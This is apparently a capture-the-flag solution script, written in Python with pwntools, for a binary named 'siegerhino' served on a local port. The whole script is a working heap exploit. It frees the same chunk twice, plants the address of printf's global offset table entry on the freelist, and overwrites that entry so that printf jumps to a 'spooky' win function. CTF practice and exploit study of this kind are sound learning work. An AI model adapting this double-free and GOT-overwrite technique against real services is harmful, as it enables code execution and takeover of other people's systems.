#!/usr/bin/env python3
from pwn import *

elf = ELF("./siegerhino")


def alloc(size, contents):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("> ")
    p.sendline(str(size))
    p.recvuntil("> ")
    p.send(contents)

def free(idx):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("> ")
    p.sendline(str(idx))

#p = process("./siegerhino")
p = remote("127.0.0.1", 30001)

payload = b"A"*8
payload += p64(0x20)
payload += b"A"*0x10

alloc(0x20, payload)

free(0) # double free that allocation
free(0)

payload = p64(elf.got["printf"])
payload += p64(0x20)
payload += b"\n"*0x10

alloc(0x20, payload) # smugglle in printf.got onto freelist


alloc(0x20, payload) # remove our chunk again

payload = p64(elf.symbols["spooky"])
alloc(0x8, payload) # overwrite printf to win func


p.interactive()
